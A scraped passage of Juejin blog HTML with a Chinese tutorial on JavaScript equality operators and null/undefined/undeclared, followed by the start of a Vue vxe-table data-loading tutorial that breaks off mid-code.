                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.在JavaScript 当中，<code>==</code> 和 <code>===</code> 与Object.is()的区别</h2>
<p>在JavaScript 当中有许多可以比较相等与否的方法。其中最常见的三个分别是**<code>===</code>(严格比较)<strong>、</strong><code>==</code>(松散比较)<strong>，以及</strong><code>Object.is</code>(同值比较)**。</p>
<h3 data-id="heading-1">1.1 ==松散比较(loose equality)</h3>
<p>==在比较两个值之前，会先强制转换数据类型，变成两者可以比较的形式。</p>
<p>如下示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span> == <span class="hljs-string">"1"</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">0</span> == <span class="hljs-literal">false</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">undefined</span> == <span class="hljs-literal">null</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>因为会强制转换型别，<code>==</code>会带给开发者一些困扰。因此多数的情况，<strong>不建议使用<code>==</code></strong>。</p>
<h3 data-id="heading-2">1.2 严格比较(strict equality)</h3>
<p><code>===</code>不会强制转换型别与值，所以如果是不同型别，比较两者会回传<code>false</code>。不同值的话一样会回传<code>false</code>，===的 JS 设计初衷是判断数值是否相同。</p>
<p>不过有两个情况例外：</p>
<ul>
<li>当我们比较<code>+0</code>和<code>-0</code>时，严格比较会回传<code>true</code>；</li>
<li>以及比较<code>NaN</code>和<code>NaN</code>会是<code>false</code>。而这两个状况则是同值比较<code>Object.is</code>派上用场的时候。</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">+<span class="hljs-number">0</span> === -<span class="hljs-number">0</span>; <span class="hljs-comment">// true</span>
<span class="hljs-title class_">NaN</span> === <span class="hljs-title class_">NaN</span>; <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-3">1.3 Object.is同值比较(same-value equality)</h3>
<p>同值比较顾名思义是在比较两个值是不是相等。虽然它是Object 开头，但比较的可以是任意的两个值。例如：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"1"</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<p>上面提到的两种在<code>===</code>时遇到的问题，可以透过<code>Object.is</code>有效分辨</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(+<span class="hljs-number">0</span>, -<span class="hljs-number">0</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-title class_">NaN</span>, <span class="hljs-title class_">NaN</span>)); <span class="hljs-comment">// true</span>
</code></pre>
<blockquote>
<p>=== +0 和-0 是 true，是因为比较的是值，就是 0 这个值，而不关心他的方向，Object.is 关心了他了方向，因为方向是不同的，所以 object.is 是false。</p>
<p><code>===</code>中的两个NaN 的比较，NaN 是一种失败状态，Not a Number,但是失败的原因是可能是不同的，所以= ==中是 false。但是在 object.is语义中，规定了所有的 NaN 都表示一种值状态，所以是 true。</p>
</blockquote>
<p>不过如果要有效分辨<code>NaN</code>，在JavaScript 有一个方法叫<code>isNaN</code>是可以使用的。假如对于<code>Object.is</code>感到陌生，可以选择用<code>Number.isNaN</code>。</p>
<h2 data-id="heading-4">2.JavaScript null、undefined 与undeclared 的区别?</h2>
<h3 data-id="heading-5">2.1 undefined 与null 的区别 ?</h3>
<p><strong><code>undefined</code>表示还未定义值，所以当一个变数被宣告但还未被赋予任何值之前</strong>，这个变数就会是<code>undefined</code>，可以理解为「尚未」。</p>
<p><strong><code>null</code>代表的是一个变数的空值，可以理解为「没有」</strong>。</p>
<p><code>undefined</code>和<code>null</code>在JavaScript 中，都是属于原始数据类型(primitive data types) 之一，也就像任何其他数据类型(data types)，例如：<code>string</code>、<code>number</code>一样，可以被赋予在变数上。两者在使用上，两者会有不同的意义。</p>
<p>举例来说，当前端要向后端索取数据时，因为需要等待数据回传，所以某个变数一开始可能是<code>undefined</code>，当数据回来时，就会变成该数据类型。以下面的例子来说，我们有个变量<code>users</code>，定义它的类型为</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">UserDTO</span>[] | <span class="hljs-literal">undefined</span>
</code></pre>
<p>而不是</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">UserDTO</span>[] | <span class="hljs-literal">null</span>
</code></pre>
<p>正是因为在拿到资料前，<code>users</code>是「尚未」。</p>
<pre><code class="hljs language-javascript" lang="javascript">type <span class="hljs-title class_">UserDTO</span> = {
  <span class="hljs-attr">id</span>: string,
  <span class="hljs-attr">firstName</span>: string,
  <span class="hljs-attr">lastName</span>: string,
  <span class="hljs-attr">profilePicture</span>: string | <span class="hljs-literal">null</span>,
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">users</span>: <span class="hljs-title class_">UserDTO</span>[] | <span class="hljs-literal">undefined</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUsers</span>();
</code></pre>
<p>反之亦然，上面的例子中，当拿到了<code>users</code>，有些使用者没有照片，因为是「没有」，所以<code>profilePicture</code>的类型是</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">profilePicture</span>: string | <span class="hljs-literal">null</span>;
</code></pre>
<p>而不是</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">profilePicture</span>: string | <span class="hljs-literal">undefined</span>;
</code></pre>
<h3 data-id="heading-6">2.2 undefined 与undeclared 的区别 ?</h3>
<p>undefined：已经声明了，但还没值</p>
<p>undeclared：压根没声明过，JS 根本不知道它是谁</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> a;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// undefined</span>
<span class="hljs-keyword">typeof</span> a; <span class="hljs-comment">// "undefined" 合法，不报错</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);
<span class="hljs-title class_">ReferenceError</span>: b is not defined <span class="hljs-comment">//undeclared 是一种代码错误状态</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue 表格 vxe-table 加载数据的几种方式，更新数据的用法]]></title>    <link>https://juejin.cn/post/7592759140038328361</link>    <guid>https://juejin.cn/post/7592759140038328361</guid>    <pubDate>2026-01-08T10:02:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038328361" data-draft-id="7592818202716962835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue 表格 vxe-table 加载数据的几种方式，更新数据的用法"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T10:02:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="放牛的小伙"/> <meta itemprop="url" content="https://juejin.cn/user/4250049649848345"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue 表格 vxe-table 加载数据的几种方式，更新数据的用法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4250049649848345/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    放牛的小伙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:02:59.000Z" title="Thu Jan 08 2026 10:02:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>vue 表格 vxe-table 加载数据的几种方式，更新数据的用法，vue 最强大的表格组件，支持 vue2 和 vue3，功能太多，这里介绍基础用法</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fvxetable.cn" target="_blank" title="https://vxetable.cn" ref="nofollow noopener noreferrer">vxetable.cn</a></p>
<h2 data-id="heading-0">双向绑定 data 方式</h2>
<p>数据是双向同步的，修改 data 就可以自动刷新</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52ac30e2f7f54764bb7cec8793410640~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS-54mb55qE5bCP5LyZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768471378&amp;x-signature=3hrNOUR3mG3aAdwmBdYskB%2FdbHk%3D" alt="11111111111111111-ezgif.com-video-to-gif-converter" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList1Event"</span>&gt;</span>修改1<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList2Event"</span>&gt;</span>修改2<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList3Event"</span>&gt;</span>修改3<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-grid</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"gridOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-grid</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> gridOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">border</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>,
  <span class="hljs-attr">columns</span>: [
    { <span class="hljs-attr">type</span>: <span class="hljs-string">'seq'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">70</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'name'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Name'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'sex'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Sex'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'age'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Age'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'address'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Address'</span>, <span class="hljs-attr">showOverflow</span>: <span class="hljs-literal">true</span> }
  ],
  <span class="hljs-attr">data</span>: []
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList1Event</span> = (<span class="hljs-params"/>) =&gt; {
  gridOptions.<span class="hljs-property">data</span> = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
  ]
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList2Event</span> = (<span class="hljs-params"/>) =&gt; {
  gridOptions.<span class="hljs-property">data</span> = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
  ]
}
<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList3Event</span> = (<span class="hljs-params"/>) =&gt; {
  gridOptions.<span class="hljs-property">data</span> = [
